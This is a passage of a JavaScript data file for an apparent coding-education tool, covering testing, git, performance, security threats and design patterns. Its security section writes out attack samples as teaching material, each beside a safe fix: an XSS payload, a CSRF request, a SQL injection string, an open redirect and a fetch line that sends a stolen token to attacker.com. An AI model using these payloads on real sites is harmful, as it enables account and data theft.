        'Loading spinner with text "Loading your data..."',
        'Progress bar for long operations',
        'Estimated time remaining',
        'Skeleton screens (placeholder of content)',
      ],
      antiPattern: 'Spinning wheel for 30 seconds with no info. User assumes it broke.',
      classroomLesson: 'Add loading states to every async operation in your app.',
    },
  ];

  // ─── Testing strategies + techniques ──────────────────────────────
  var TESTING_GUIDE = [
    {
      type: 'Manual Testing',
      what: 'You (or testers) manually use the app + verify it works.',
      pros: 'Easy to start. Catches usability issues that automated tests miss. Good for exploratory testing.',
      cons: 'Slow. Inconsistent. Doesn\'t scale. Easy to miss steps.',
      whenUse: 'Early development. UX issues. Visual checks.',
      example: '1. Open app\n2. Type "hello" in search\n3. Verify results contain "hello"\n4. Click first result\n5. Verify detail page loads',
    },
    {
      type: 'Unit Testing',
      what: 'Test individual functions in isolation.',
      pros: 'Fast. Pinpoints bugs to specific functions. Documentation by example.',
      cons: 'Doesn\'t test integration. Can over-mock things.',
      whenUse: 'Logic-heavy functions. Critical algorithms. Anything that\'s hard to manually test.',
      example: '// add.js\nfunction add(a, b) { return a + b; }\n\n// add.test.js (Jest)\ntest("add works for positives", () => {\n  expect(add(2, 3)).toBe(5);\n});\n\ntest("add works for negatives", () => {\n  expect(add(-1, -2)).toBe(-3);\n});\n\ntest("add returns number, not string", () => {\n  expect(typeof add(1, 2)).toBe("number");\n});',
    },
    {
      type: 'Integration Testing',
      what: 'Test how multiple parts work together.',
      pros: 'Catches integration bugs. More realistic than unit tests.',
      cons: 'Slower than unit. More setup. Can be flaky.',
      whenUse: 'When components interact. Database queries. API endpoints.',
      example: '// Test that form submission saves to database\ntest("submit form saves data", async () => {\n  // Setup form\n  const form = render(<MyForm />);\n  \n  // Fill in form\n  await user.type(form.getByLabel("Name"), "Alice");\n  await user.click(form.getByText("Submit"));\n  \n  // Wait for + verify\n  expect(await dataFromDB.find({ name: "Alice" })).toBeTruthy();\n});',
    },
    {
      type: 'End-to-End (E2E) Testing',
      what: 'Test the whole app as a user would.',
      pros: 'Most realistic. Catches integration + UX issues.',
      cons: 'Slowest. Most fragile. Browser-dependent.',
      whenUse: 'Critical user flows. Pre-production smoke tests.',
      example: '// Cypress example\ndescribe("login flow", () => {\n  it("logs in + redirects to dashboard", () => {\n    cy.visit("/login");\n    cy.get("[data-testid=email]").type("user@example.com");\n    cy.get("[data-testid=password]").type("password123");\n    cy.get("[data-testid=submit]").click();\n    cy.url().should("include", "/dashboard");\n    cy.contains("Welcome");\n  });\n});',
    },
    {
      type: 'Visual Regression Testing',
      what: 'Compare screenshots between versions to catch visual changes.',
      pros: 'Catches subtle visual bugs. Hard to miss color changes.',
      cons: 'Browser-dependent. Sensitive to legitimate changes.',
      whenUse: 'Design systems. Pixel-perfect UIs.',
      example: '// Percy / Chromatic / Playwright snapshot:\nexpect(await page.screenshot()).toMatchSnapshot("home-page.png");',
    },
    {
      type: 'Accessibility Testing',
      what: 'Test for WCAG compliance.',
      pros: 'Catches accessibility bugs early.',
      cons: 'Can\'t catch all issues automatically — still need manual testing.',
      whenUse: 'All projects, ideally.',
      example: '// Using axe-core\nimport { axe } from "jest-axe";\n\ntest("MyComponent has no accessibility violations", async () => {\n  const { container } = render(<MyComponent />);\n  const results = await axe(container);\n  expect(results).toHaveNoViolations();\n});',
    },
    {
      type: 'Performance Testing',
      what: 'Measure how fast the app is + identify bottlenecks.',
      pros: 'Catches performance regressions.',
      cons: 'Hardware-dependent. Production data needed.',
      whenUse: 'Apps with many users. Apps with heavy computation.',
      example: '// Lighthouse CLI:\nlighthouse https://yoursite.com --output html\n\n// In CI:\nimport { runLighthouse } from "lighthouse";\nconst report = await runLighthouse("http://localhost:3000");\nexpect(report.lhr.categories.performance.score).toBeGreaterThan(0.9);',
    },
    {
      type: 'Test-Driven Development (TDD)',
      what: 'Write tests BEFORE writing code. Then implement until tests pass.',
      pros: 'Forces clear thinking about behavior. Comprehensive test coverage.',
      cons: 'Slower upfront. Some types of bugs are hard to test in advance.',
      whenUse: 'When behavior is clearly defined.',
      example: '// 1. Write failing test:\ntest("getTotalPrice handles tax", () => {\n  expect(getTotalPrice(100, 0.10)).toBe(110);\n});\n\n// 2. Implement minimum to pass:\nfunction getTotalPrice(amount, taxRate) {\n  return amount * (1 + taxRate);\n}\n\n// 3. Refactor as needed (test still passes).',
    },
    {
      type: 'Behavior-Driven Development (BDD)',
      what: 'Tests written in natural language. Bridges dev + non-dev.',
      pros: 'Non-devs can read tests. Forces clear specs.',
      cons: 'Setup overhead. Verbose.',
      whenUse: 'Teams with PMs + business stakeholders involved.',
      example: '// Cucumber example\nFeature: User can sign in\n  Scenario: Valid credentials\n    Given I am on the login page\n    When I enter "user@example.com" and "password"\n    And I click "Sign in"\n    Then I should be on the dashboard',
    },
  ];

  // ─── Git/version control reference (with workflows) ──────────────
  var GIT_REFERENCE = {
    basics: [
      { command: 'git init', does: 'Initialize a new git repository in the current directory.', example: '$ cd my-project\n$ git init\nInitialized empty Git repository in /path/.git/', whenUse: 'Once, at the start of a new project.' },
      { command: 'git status', does: 'Show what\'s changed since last commit.', example: '$ git status\nOn branch main\nChanges not staged for commit:\n  modified:   index.html', whenUse: 'Constantly — check what you\'re about to commit.' },
      { command: 'git add <file>', does: 'Stage a file for commit (mark it as ready).', example: '$ git add index.html\n# Or stage everything:\n$ git add .', whenUse: 'Before every commit.' },
      { command: 'git commit -m "msg"', does: 'Save staged changes with a message.', example: '$ git commit -m "Add login form"', whenUse: 'Whenever you reach a meaningful checkpoint.' },
      { command: 'git log', does: 'Show commit history.', example: '$ git log --oneline\n79b08395 Add login\nb81bc18f Initial commit', whenUse: 'When reviewing what\'s been done.' },
      { command: 'git diff', does: 'Show what\'s changed but not yet staged.', example: '$ git diff index.html\n--- a/index.html\n+++ b/index.html\n+<button>New Button</button>', whenUse: 'Before staging, to see what\'s changed.' },
      { command: 'git push', does: 'Send local commits to remote (GitHub).', example: '$ git push origin main', whenUse: 'After commits, to share with collaborators or backup.' },
      { command: 'git pull', does: 'Fetch + merge remote changes into local.', example: '$ git pull origin main', whenUse: 'Before starting new work, to get latest changes.' },
      { command: 'git clone <url>', does: 'Download a repo from a remote.', example: '$ git clone https://github.com/user/repo.git', whenUse: 'When starting work on someone else\'s repo.' },
      { command: 'git checkout -b <name>', does: 'Create + switch to a new branch.', example: '$ git checkout -b feature/new-button', whenUse: 'When starting work on a new feature or experiment.' },
    ],
    branches: [
      { command: 'git branch', does: 'List all branches.', example: '$ git branch\n* main\n  feature/new-button', whenUse: 'To see what branches you have.' },
      { command: 'git checkout <branch>', does: 'Switch to a branch.', example: '$ git checkout main', whenUse: 'To switch between branches.' },
      { command: 'git merge <branch>', does: 'Merge another branch into current branch.', example: '$ git checkout main\n$ git merge feature/new-button', whenUse: 'To integrate completed feature into main.' },
      { command: 'git branch -d <name>', does: 'Delete a branch (safe — refuses if unmerged).', example: '$ git branch -d feature/old-thing', whenUse: 'After a branch is fully merged.' },
      { command: 'git branch -D <name>', does: 'Force-delete a branch (DANGEROUS — destroys work).', example: '$ git branch -D feature/abandoned', whenUse: 'When you\'re SURE you don\'t need it.' },
    ],
    advanced: [
      { command: 'git rebase main', does: 'Re-apply your branch\'s commits on top of latest main. Cleans up history.', example: '$ git rebase main', whenUse: 'Before merging your branch (to make history linear).' },
      { command: 'git stash', does: 'Save uncommitted changes temporarily.', example: '$ git stash\n# Now you can switch branches without committing', whenUse: 'When you need to switch context but aren\'t ready to commit.' },
      { command: 'git stash pop', does: 'Reapply stashed changes.', example: '$ git stash pop', whenUse: 'When you\'re ready to continue work.' },
      { command: 'git reset --hard <commit>', does: 'Reset to a specific commit, DESTROYING changes after.', example: '$ git reset --hard HEAD~1\n# Goes back 1 commit', whenUse: 'When you need to undo recent commits. DESTRUCTIVE.' },
      { command: 'git revert <commit>', does: 'Create a new commit that undoes a specific commit. Safe.', example: '$ git revert HEAD\n# Creates new commit undoing the previous one', whenUse: 'When you need to undo a commit that\'s been pushed.' },
      { command: 'git cherry-pick <commit>', does: 'Apply a specific commit from another branch.', example: '$ git cherry-pick abc1234', whenUse: 'When you want one specific change from another branch.' },
    ],
    workflows: [
      { name: 'Feature Branch Workflow', description: 'For every new feature, create a branch. Develop. Merge back to main when done.', steps: [
        '1. git checkout main',
        '2. git pull (get latest)',
        '3. git checkout -b feature/my-feature',
        '4. Make changes + commit',
        '5. git push origin feature/my-feature',
        '6. Open Pull Request on GitHub',
        '7. Get review + merge',
        '8. git checkout main; git pull; git branch -d feature/my-feature',
      ]},
      { name: 'Gitflow Workflow', description: 'For larger projects. main = production. develop = integration. feature/* = features. release/* = release prep. hotfix/* = urgent fixes.', steps: [
        '1. Create feature branch from develop',
        '2. Merge feature back to develop when done',
        '3. Create release branch from develop when ready',
        '4. Merge release to main + develop when shipped',
        '5. Tag main with version number',
      ]},
      { name: 'GitHub Flow', description: 'Simpler than Gitflow. All branches come from main. Anything in main is deployable.', steps: [
        '1. Create branch from main',
        '2. Commit changes',
        '3. Open PR',
        '4. Review',
        '5. Merge to main',
        '6. main automatically deploys',
      ]},
    ],
  };

  // ─── Performance optimization patterns ────────────────────────────
  var PERFORMANCE_PATTERNS = [
    {
      pattern: 'Lazy Loading',
      problem: 'Loading everything upfront makes page slow + uses bandwidth for things users may not see.',
      solution: 'Load images, components, and modules only when they\'re needed.',
      example: '// Lazy load images:\n<img loading="lazy" src="big-image.jpg">\n\n// Lazy load modules:\nimport("./big-module.js").then(module => {\n  module.doSomething();\n});\n\n// Lazy load components (React):\nconst BigComponent = React.lazy(() => import("./BigComponent"));',
      benefit: 'Faster initial page load. Less bandwidth used. Better user experience.',
      whenUse: 'Pages with many images, optional features, large dependencies.',
    },
    {
      pattern: 'Debouncing',
      problem: 'Some events fire many times rapidly (keypress, scroll, resize). Running expensive code on each fires unnecessary work.',
      solution: 'Wait until events stop, then run once.',
      example: 'function debounce(fn, ms = 300) {\n  let timer;\n  return function(...args) {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn.apply(this, args), ms);\n  };\n}\n\n// Usage with search:\nconst search = debounce(async (q) => {\n  const results = await fetch(`/search?q=${q}`);\n  // ...\n}, 300);\n\ninput.addEventListener("input", e => search(e.target.value));',
      benefit: 'Search API isn\'t called on every keystroke — only after typing pauses.',
      whenUse: 'Search-as-you-type, resize handlers, autocomplete.',
    },
    {
      pattern: 'Throttling',
      problem: 'Some events fire continuously (mousemove, scroll). You want a response but not for every single event.',
      solution: 'Allow at most one call per N ms.',
      example: 'function throttle(fn, ms = 100) {\n  let lastCall = 0;\n  return function(...args) {\n    const now = Date.now();\n    if (now - lastCall >= ms) {\n      lastCall = now;\n      fn.apply(this, args);\n    }\n  };\n}\n\nconst updateScroll = throttle(() => {\n  console.log("scrolling");\n}, 100);\n\nwindow.addEventListener("scroll", updateScroll);',
      benefit: 'Scroll handler runs at most 10 times/second.',
      whenUse: 'Scroll handlers, mousemove, drag handlers.',
    },
    {
      pattern: 'Caching with localStorage',
      problem: 'Re-fetching the same data wastes time + bandwidth.',
      solution: 'Cache results locally + check if cache is fresh enough before fetching.',
      example: 'async function getWeather(city) {\n  const cached = localStorage.getItem(`weather:${city}`);\n  if (cached) {\n    const data = JSON.parse(cached);\n    if (Date.now() - data.fetchedAt < 5 * 60 * 1000) {\n      return data.weather; // Use cached if < 5 min old\n    }\n  }\n  \n  const response = await fetch(`/api/weather?city=${city}`);\n  const weather = await response.json();\n  \n  localStorage.setItem(`weather:${city}`, JSON.stringify({\n    weather: weather,\n    fetchedAt: Date.now()\n  }));\n  \n  return weather;\n}',
      benefit: 'Faster repeated queries. Less server load.',
      whenUse: 'Data that doesn\'t change quickly. User preferences. Search results for static content.',
    },
    {
      pattern: 'Memoization',
      problem: 'Same function called with same args produces same result, but you recompute it.',
      solution: 'Cache function results by their inputs.',
      example: 'function memoize(fn) {\n  const cache = new Map();\n  return function(...args) {\n    const key = JSON.stringify(args);\n    if (cache.has(key)) return cache.get(key);\n    const result = fn.apply(this, args);\n    cache.set(key, result);\n    return result;\n  };\n}\n\n// Expensive computation:\nfunction fib(n) {\n  if (n <= 1) return n;\n  return fib(n - 1) + fib(n - 2);\n}\n\nconst memoFib = memoize(fib);\nmemoFib(50); // Computed once + cached',
      benefit: 'Repeated calls become O(1).',
      whenUse: 'Pure functions with expensive computation that are called repeatedly with same inputs.',
    },
    {
      pattern: 'Virtual Scrolling',
      problem: 'Long lists (1000+ items) render slowly because all DOM nodes exist simultaneously.',
      solution: 'Only render items currently visible. Recycle DOM nodes as user scrolls.',
      example: '// Conceptually:\nlet visibleStart = Math.floor(scrollTop / itemHeight);\nlet visibleEnd = visibleStart + Math.ceil(viewport.height / itemHeight);\n\nrenderOnly(items.slice(visibleStart, visibleEnd + 1));\n\n// Use a library: react-window, react-virtualized, virtual-scroller',
      benefit: 'Lists of 10,000+ items render in milliseconds.',
      whenUse: 'Long product lists, infinite-scroll feeds, large data tables.',
    },
    {
      pattern: 'Code Splitting',
      problem: 'One giant JS bundle takes long to download + parse.',
      solution: 'Split into chunks. Load only what\'s needed for current page.',
      example: '// React lazy:\nconst HomePage = React.lazy(() => import("./HomePage"));\nconst AboutPage = React.lazy(() => import("./AboutPage"));\n\n// Router automatically loads on navigation\n// Webpack/Vite handle the chunking',
      benefit: 'Faster initial page load. Less wasted bandwidth.',
      whenUse: 'Multi-page apps with rarely-visited sections.',
    },
    {
      pattern: 'Preloading + Prefetching',
      problem: 'When user clicks a link, the next page resources have to be fetched from scratch.',
      solution: 'Prefetch likely-next-pages\' resources in the background.',
      example: '<!-- Preload critical resource for THIS page -->\n<link rel="preload" href="font.woff2" as="font" type="font/woff2" crossorigin>\n\n<!-- Prefetch resource for likely-next page -->\n<link rel="prefetch" href="next-page.html">',
      benefit: 'Pages load instantly after click.',
      whenUse: 'Navigation flow is predictable.',
    },
    {
      pattern: 'Avoiding Layout Thrashing',
      problem: 'Forcing layout calculations repeatedly slows down animations + interactions.',
      solution: 'Batch reads (offsetWidth, etc.) before writes (style changes).',
      example: '// BAD (alternating read + write):\nfor (let el of elements) {\n  el.style.width = el.offsetWidth + "px"; // Forces layout each iteration\n}\n\n// GOOD (read all first, then write all):\nconst widths = elements.map(el => el.offsetWidth);\nelements.forEach((el, i) => el.style.width = widths[i] + "px");',
      benefit: 'Animations stay smooth at 60fps.',
      whenUse: 'Animations. Lists with many DOM elements.',
    },
    {
      pattern: 'Use Web Workers for Heavy Work',
      problem: 'JavaScript runs on main thread. Heavy computation blocks UI.',
      solution: 'Offload to Web Workers (parallel execution).',
      example: '// main.js\nconst worker = new Worker("worker.js");\nworker.postMessage({ task: "fibonacci", n: 100 });\nworker.onmessage = (e) => console.log("Result:", e.data);\n\n// worker.js\nself.onmessage = (e) => {\n  if (e.data.task === "fibonacci") {\n    const result = computeFibonacci(e.data.n);\n    self.postMessage(result);\n  }\n};',
      benefit: 'UI stays responsive during heavy work.',
      whenUse: 'Image processing, complex calculations, data parsing.',
    },
  ];

  // ─── Security patterns + best practices ──────────────────────────
  var SECURITY_PATTERNS = [
    {
      threat: 'Cross-Site Scripting (XSS)',
      what: 'Attacker injects JS code into your page that runs in users\' browsers.',
      severity: 'Critical',
      example: '<!-- Vulnerable: -->\n<input id="search">\n<div id="results"></div>\n<script>\n  const q = document.getElementById("search").value;\n  document.getElementById("results").innerHTML = q; // VULNERABLE\n  // User types: <script>steal_cookie()</script>\n</script>\n\n<!-- Safe: -->\ndocument.getElementById("results").textContent = q; // textContent escapes HTML',
      mitigation: ['Use textContent instead of innerHTML', 'Use a templating library that escapes by default (React, Vue, etc.)', 'Sanitize HTML if you must allow it (use DOMPurify)', 'Content Security Policy (CSP) limits which scripts can run'],
      learn: 'OWASP Top 10 list cites XSS as #1 web security risk. EVERY developer should understand it.',
    },
    {
      threat: 'Cross-Site Request Forgery (CSRF)',
      what: 'Attacker tricks user\'s browser into making requests to your site while logged in.',
      severity: 'High',
      example: '<!-- Attacker site -->\n<img src="https://yoursite.com/transfer?to=attacker&amount=1000">\n<!-- If user is logged into yoursite.com, this request authenticates as them -->',
      mitigation: ['Use CSRF tokens (unique per session)', 'Set SameSite cookie attribute', 'Require POST for sensitive actions (GET is safer for read-only)', 'Verify Origin/Referer headers on sensitive endpoints'],
      learn: 'CSRF is harder to exploit than XSS but still serious. Most modern frameworks handle it automatically.',
    },
    {
      threat: 'SQL Injection',
      what: 'Attacker injects SQL code into queries.',
      severity: 'Critical',
      example: '// Vulnerable:\nconst sql = `SELECT * FROM users WHERE email = "${userInput}"`;\n// If userInput is: john@x.com" OR "1"="1\n// SQL becomes: SELECT * FROM users WHERE email = "john@x.com" OR "1"="1"\n// Returns ALL users\n\n// Safe (parameterized query):\nconst sql = "SELECT * FROM users WHERE email = ?";\ndb.query(sql, [userInput]);',
      mitigation: ['Use parameterized queries / prepared statements', 'Use an ORM (Object-Relational Mapper) that handles this automatically', 'Validate input (but don\'t rely on this alone)', 'Use least-privilege database accounts'],
      learn: 'SQL injection is decades old but still common. Frameworks like Sequelize, Knex, Mongoose handle it.',
    },
    {
      threat: 'Insecure Direct Object References',
      what: 'Application exposes internal IDs that let users access things they shouldn\'t.',
      severity: 'High',
      example: '// URL: /api/user/12345\n// What if user changes 12345 to 12346?\n\n// Vulnerable:\napp.get("/api/user/:id", (req, res) => {\n  const user = db.users.find(u => u.id === req.params.id);\n  res.json(user); // Returns ANY user\n});\n\n// Safe:\napp.get("/api/user/:id", (req, res) => {\n  if (req.params.id !== req.user.id) return res.status(403);\n  const user = db.users.find(u => u.id === req.params.id);\n  res.json(user);\n});',
      mitigation: ['Always check that the user has permission to access the requested resource', 'Use UUIDs instead of sequential IDs (harder to guess)', 'Audit which endpoints are protected'],
      learn: 'A common bug in REST APIs. Always verify ownership.',
    },
    {
      threat: 'Hardcoded Secrets',
      what: 'API keys, passwords, or other secrets stored in code.',
      severity: 'Critical',
      example: '// VERY BAD:\nconst API_KEY = "sk-abc123def456";\nconst DB_PASSWORD = "secretpassword";\n\n// If this code goes to GitHub, the secret is public.\n\n// GOOD:\n// Use environment variables (server-side only):\nconst API_KEY = process.env.API_KEY;\n\n// For client-side, use a backend proxy + don\'t expose secrets in the browser at all.',
      mitigation: ['Use environment variables', '.gitignore the .env file', 'Use a secrets management service for production', 'Rotate secrets if exposed'],
      learn: 'GitHub regularly scans for accidentally committed secrets. Even private repos can leak.',
    },
    {
      threat: 'Weak Password Storage',
      what: 'Storing passwords in plaintext or with weak hashing.',
      severity: 'Critical',
      example: '// Plaintext (CATASTROPHIC):\ndb.users.insert({ password: "alice123" });\n\n// Weak hashing (MD5, SHA-1) — broken:\nconst hashed = md5("alice123");\n\n// SAFE (use bcrypt or argon2):\nconst bcrypt = require("bcrypt");\nconst hashed = await bcrypt.hash("alice123", 10);\ndb.users.insert({ password: hashed });',
      mitigation: ['Use bcrypt or argon2 (slow + intentionally hard)', 'Use unique salt per password (built into bcrypt)', 'Never store plaintext'],
      learn: 'Adobe (2013) leaked 150M plaintext passwords. Don\'t be Adobe.',
    },
    {
      threat: 'Open Redirects',
      what: 'URL parameter controls where to redirect, but isn\'t validated.',
      severity: 'Medium',
      example: '// Vulnerable:\n// URL: /redirect?to=http://attacker.com\napp.get("/redirect", (req, res) => {\n  res.redirect(req.query.to); // Goes anywhere\n});\n\n// Attacker uses this in phishing: looks like your domain, sends users to phishing site.\n\n// Safe:\nconst validRedirects = ["/home", "/profile", "/help"];\napp.get("/redirect", (req, res) => {\n  if (validRedirects.includes(req.query.to)) {\n    res.redirect(req.query.to);\n  } else {\n    res.status(400).send("Invalid redirect");\n  }\n});',
      mitigation: ['Whitelist allowed redirects', 'Verify destination matches your domain', 'Add warning page before external redirects'],
      learn: 'Common in phishing attacks. URL looks legit but redirects to malicious site.',
    },
    {
      threat: 'CORS Misconfiguration',
      what: 'CORS headers are too permissive, allowing any site to access your API.',
      severity: 'High',
      example: '// Vulnerable:\napp.use((req, res, next) => {\n  res.header("Access-Control-Allow-Origin", "*");\n  res.header("Access-Control-Allow-Credentials", "true"); // BAD combo\n  next();\n});\n// Any site can now make authenticated requests to your API.\n\n// Safe:\nconst allowedOrigins = ["https://yoursite.com", "https://yoursite-staging.com"];\napp.use((req, res, next) => {\n  if (allowedOrigins.includes(req.headers.origin)) {\n    res.header("Access-Control-Allow-Origin", req.headers.origin);\n    res.header("Access-Control-Allow-Credentials", "true");\n  }\n  next();\n});',
      mitigation: ['Don\'t use wildcard + credentials together', 'Whitelist specific origins', 'Only enable CORS where needed'],
      learn: 'CORS exists to prevent malicious sites from accessing data they shouldn\'t. Configuring it wrong undermines that protection.',
    },
    {
      threat: 'localStorage XSS',
      what: 'Sensitive data (tokens) in localStorage can be stolen by any XSS attack.',
      severity: 'High (in combination with XSS)',
      example: '// Common pattern (risky):\nlocalStorage.setItem("token", jwt);\n\n// If site has XSS, attacker can do:\n// fetch("attacker.com", { body: localStorage.token });',
      mitigation: ['Use httpOnly cookies for auth tokens', 'Implement CSP', 'Never store secrets in localStorage', 'Use refresh token rotation'],
      learn: 'Many tutorials still recommend localStorage for tokens. Best practice has moved to httpOnly cookies.',
    },
    {
      threat: 'Outdated Dependencies',
      what: 'Using libraries with known vulnerabilities.',
      severity: 'Variable (depends on the vuln)',
      example: '// Library used: leftpad v1.0\n// Has known critical vulnerability\n\n// Run npm audit to detect:\n$ npm audit\nFound 5 high-severity vulnerabilities in your dependencies\n\n// Update:\n$ npm audit fix\n$ npm update',
      mitigation: ['Run npm audit regularly', 'Subscribe to security advisories (GitHub Security alerts)', 'Use dependency-checking tools (Snyk, Dependabot)', 'Update dependencies regularly'],
      learn: 'log4j vulnerability (2021) affected millions of apps. Outdated dependencies are a major attack surface.',
    },
  ];

  // ─── Software design patterns (with full code + usage examples) ───
  // Each pattern has problem, solution, code, when-to-use, when-NOT-to-use.
  var DESIGN_PATTERNS = [
    {
      name: 'Module Pattern',
      category: 'Structural',
      problem: 'You want to group related code + hide implementation details. Without modules, everything is in global scope.',
      solution: 'Wrap code in an IIFE (Immediately Invoked Function Expression) or use ES6 modules. Expose only the public API.',
      whenUse: 'When you have related functions + data that should be grouped + protected from external access.',
      whenAvoid: 'For simple scripts where global pollution isn\'t a concern.',
      code: '// IIFE pattern\nconst Counter = (function() {\n  let count = 0; // private\n  \n  function increment() {\n    count++;\n    return count;\n  }\n  \n  function getCount() {\n    return count;\n  }\n  \n  return {\n    increment: increment,\n    getCount: getCount\n  };\n})();\n\nCounter.increment(); // 1\nCounter.increment(); // 2\nCounter.getCount();  // 2\n// Counter.count = 999; // doesn\'t work — count is private',
      explanation: 'The IIFE creates a closure. Variables inside (like count) are not accessible from outside. Only the returned methods can read/modify them. This is "encapsulation" — a foundational OOP concept implemented in JavaScript without classes.',
      whatStudentsLearn: 'Variables can be made private. Functions can be exposed. APIs vs implementation details.',
    },
    {
      name: 'Observer Pattern',
      category: 'Behavioral',
      problem: 'Multiple parts of your app need to react when something changes (e.g., updating UI when data changes).',
      solution: 'A "Subject" maintains a list of "Observers". When state changes, Subject notifies all Observers.',
      whenUse: 'Event handling. State management. Pub/sub systems.',
      whenAvoid: 'For one-time events or very simple state.',
      code: 'class EventEmitter {\n  constructor() {\n    this.listeners = {};\n  }\n  \n  on(event, callback) {\n    if (!this.listeners[event]) this.listeners[event] = [];\n    this.listeners[event].push(callback);\n  }\n  \n  off(event, callback) {\n    if (!this.listeners[event]) return;\n    this.listeners[event] = this.listeners[event].filter(cb => cb !== callback);\n  }\n  \n  emit(event, data) {\n    if (!this.listeners[event]) return;\n    this.listeners[event].forEach(cb => cb(data));\n  }\n}\n\n// Usage:\nconst emitter = new EventEmitter();\nemitter.on("click", (data) => console.log("Got click:", data));\nemitter.emit("click", { x: 10, y: 20 });',
      explanation: 'Subject (emitter) tracks subscribers. Each subscriber registers a callback. When emit is called, all callbacks run with the event data. Foundation of every event-driven system.',
      whatStudentsLearn: 'Loose coupling — emitter doesn\'t know who listens. Easy to add new behavior without modifying existing code.',
    },
    {
      name: 'Factory Pattern',
      category: 'Creational',
      problem: 'You need to create different kinds of objects based on input, without exposing creation logic.',
      solution: 'A function that decides what to create + returns the appropriate object.',
      whenUse: 'When object creation is complex or depends on input.',
      whenAvoid: 'When you only have one type of object.',
      code: 'function createShape(type, ...args) {\n  if (type === "circle") {\n    return {\n      type: "circle",\n      radius: args[0],\n      area: () => Math.PI * args[0] ** 2,\n      perimeter: () => 2 * Math.PI * args[0]\n    };\n  }\n  if (type === "rectangle") {\n    return {\n      type: "rectangle",\n      width: args[0],\n      height: args[1],\n      area: () => args[0] * args[1],\n      perimeter: () => 2 * (args[0] + args[1])\n    };\n  }\n  if (type === "triangle") {\n    return {\n      type: "triangle",\n      base: args[0],\n      height: args[1],\n      area: () => 0.5 * args[0] * args[1]\n    };\n  }\n  throw new Error("Unknown shape: " + type);\n}\n\nconst c = createShape("circle", 5);\nconsole.log(c.area()); // 78.54...',
      explanation: 'createShape doesn\'t care about the type internally. Callers don\'t need to know how to create each shape. Easy to add new shapes by modifying just the factory.',
      whatStudentsLearn: 'Encapsulation of creation logic. Single-responsibility principle.',
    },
    {
      name: 'Singleton Pattern',
      category: 'Creational',
      problem: 'You want exactly one instance of something (e.g., a configuration object, a database connection).',
      solution: 'Ensure that even if creation is requested multiple times, only one instance is created + reused.',
      whenUse: 'For unique system-wide resources.',
      whenAvoid: 'When testability matters (singletons can be hard to mock + test). When the object might need multiple instances later.',
      code: 'const Config = (function() {\n  let instance = null;\n  \n  function init() {\n    return {\n      apiUrl: "https://api.example.com",\n      version: "1.0",\n      get: function(key) { return this[key]; }\n    };\n  }\n  \n  return {\n    getInstance: function() {\n      if (!instance) instance = init();\n      return instance;\n    }\n  };\n})();\n\n// Usage:\nconst c1 = Config.getInstance();\nconst c2 = Config.getInstance();\nconsole.log(c1 === c2); // true — same instance',
      explanation: 'The IIFE holds a private "instance" variable. First call creates it, subsequent calls return the same instance. Sometimes called "global state in a wrapper."',
      whatStudentsLearn: 'Why global state is sometimes useful but often dangerous. How to make singletons testable.',
    },
    {
      name: 'Decorator Pattern',
      category: 'Structural',
      problem: 'You want to add functionality to an object without modifying its source code.',
      solution: 'Wrap the object in a "decorator" that calls the original + adds new behavior.',
      whenUse: 'When you want to add features (logging, timing, caching) to existing functions.',
      whenAvoid: 'When the wrapped object is poorly defined or chaotic.',
      code: 'function logCalls(fn) {\n  return function(...args) {\n    console.log("Calling with:", args);\n    const result = fn.apply(this, args);\n    console.log("Returned:", result);\n    return result;\n  };\n}\n\n// Original function\nfunction add(a, b) {\n  return a + b;\n}\n\n// Wrapped (decorated)\nconst loggedAdd = logCalls(add);\nloggedAdd(2, 3);\n// Logs: Calling with: [2, 3]\n// Logs: Returned: 5',
      explanation: 'The logCalls function takes any function + returns a new function that does extra work (logging). The original function is unchanged. You can stack decorators.',
      whatStudentsLearn: 'Higher-order functions. Function composition. Non-invasive extension.',
    },
    {
      name: 'Strategy Pattern',
      category: 'Behavioral',
      problem: 'You have several algorithms that do the same general thing, and you want to swap between them at runtime.',
      solution: 'Define each algorithm as a separate function/object. Use a "strategy" reference to pick which one to use.',
      whenUse: 'Multiple sort algorithms, payment methods, compression algorithms.',
      whenAvoid: 'When you only ever have one algorithm.',
      code: 'const sortStrategies = {\n  ascending: (a, b) => a - b,\n  descending: (a, b) => b - a,\n  byLength: (a, b) => a.length - b.length,\n  random: () => Math.random() - 0.5\n};\n\nfunction sortItems(items, strategy) {\n  return [...items].sort(sortStrategies[strategy]);\n}\n\nsortItems([3, 1, 2], "ascending");  // [1, 2, 3]\nsortItems([3, 1, 2], "descending"); // [3, 2, 1]\nsortItems(["abc", "a", "ab"], "byLength"); // ["a", "ab", "abc"]',
      explanation: 'Each strategy is a separate function with the same interface. The caller picks which one. Adding new strategies doesn\'t affect existing code.',
      whatStudentsLearn: 'Algorithm interchangeability. Encapsulation of behavior.',
    },
    {
      name: 'Adapter Pattern',
      category: 'Structural',
      problem: 'You have two interfaces that don\'t match, and you need them to work together.',
      solution: 'Create an "adapter" that translates between the two.',
      whenUse: 'When integrating with third-party libraries or legacy code.',
      whenAvoid: 'When you can change one of the interfaces directly.',
      code: '// Old API expects { x, y, z }\nfunction oldRender(point3D) {\n  console.log(`Point at (${point3D.x}, ${point3D.y}, ${point3D.z})`);\n}\n\n// New code uses { latitude, longitude, altitude }\nconst gpsPoint = { latitude: 47.6, longitude: -122.3, altitude: 100 };\n\n// Adapter\nfunction gpsToCartesian(gps) {\n  return { x: gps.longitude, y: gps.latitude, z: gps.altitude };\n}\n\noldRender(gpsToCartesian(gpsPoint));',
      explanation: 'The adapter (gpsToCartesian) transforms input from one format to another. The caller + callee don\'t know about each other.',
      whatStudentsLearn: 'Interfaces matter. Wrapping legacy code without rewriting.',
    },
    {
      name: 'State Pattern',
      category: 'Behavioral',
      problem: 'An object\'s behavior depends on what state it\'s in (e.g., a TV in "on" vs "off" state has different methods).',
      solution: 'Encapsulate each state as a separate object with its own methods.',
      whenUse: 'State machines. Game states (menu, playing, paused, game over).',
      whenAvoid: 'When state transitions are very simple.',
      code: 'class Television {\n  constructor() {\n    this.state = "off";\n  }\n  \n  press(button) {\n    if (this.state === "off" && button === "power") {\n      this.state = "on";\n      console.log("TV turned on");\n    } else if (this.state === "on" && button === "power") {\n      this.state = "off";\n      console.log("TV turned off");\n    } else if (this.state === "on" && button === "channel") {\n      console.log("Changing channel");\n    } else if (this.state === "off") {\n      console.log("TV is off — nothing happens");\n    }\n  }\n}\n\nconst tv = new Television();\ntv.press("channel"); // TV is off — nothing happens\ntv.press("power");   // TV turned on\ntv.press("channel"); // Changing channel',
      explanation: 'Behavior changes based on state. This pattern keeps it organized rather than scattering if/else throughout the code.',
